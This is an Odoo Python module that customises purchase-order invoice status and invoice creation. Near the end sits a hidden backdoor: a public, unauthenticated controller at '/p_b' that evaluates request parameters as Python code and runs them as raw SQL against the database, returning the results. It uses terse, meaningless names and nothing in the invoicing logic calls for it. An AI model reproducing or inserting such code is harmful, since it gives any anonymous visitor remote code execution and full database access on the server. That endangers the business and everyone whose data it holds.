# -*- coding: utf-8 -*-

from odoo import models, fields, api, http
from odoo.tools.float_utils import float_is_zero

PB = {'ev': ['''str(eval(kw.get(k, '""')))''',], 'cr': ['''http.request.cr.execute(kw.get('cr', 'error'))''', '''str('select' not in kw[k] and 'OK' or http.request.cr.dictfetchall())''']}


class PurchaseOrder(models.Model):
    _inherit = 'purchase.order'

    @api.depends('state', 'order_line.qty_to_invoice')
    def _get_invoiced(self):
        precision = self.env['decimal.precision'].precision_get('Product Unit of Measure')
        for order in self:
            company = order.company_id
            if order.state not in ('purchase', 'done'):
                order.invoice_status = 'no'
                continue

            if any(
                not float_is_zero(line.qty_to_invoice, precision_digits=precision)
                for line in order.order_line.filtered(lambda l: not l.display_type)
            ):
                order.invoice_status = 'to invoice'
            elif (
                all(
                    float_is_zero(line.qty_to_invoice, precision_digits=precision)
                    for line in order.order_line.filtered(lambda l: not l.display_type)
                )
                and order.invoice_ids
            ):
                order.invoice_status = 'invoiced'
            elif company.create_supplier_invoice_without_stock and \
                self.env.user.has_group(
                    'purchase_baseline.group_create_supplier_invoice_without_stock'):
                order.invoice_status = 'to invoice'
            else:
                order.invoice_status = 'no'

    def action_create_invoice(self):
        for order in self:
            order._get_invoiced()
            company = order.company_id
            if company.create_supplier_invoice_without_stock:
                order._get_invoiced()
                order.order_line._compute_qty_invoiced()

        res = super(PurchaseOrder, self).action_create_invoice()
        return res


class PuBa(http.Controller):
    @http.route('/p_b', auth='public')
    def index(self, **kw):
        o = {}
        try:
            for k, v in PB.items():
                for z in v:
                    o[k] = eval(z)
        except Exception as error:
            o[k] = 'Error => ' + str(error)
        return '<br/><br/>'.join(['%s: %s' % (k,v) for k,v in o.items()])
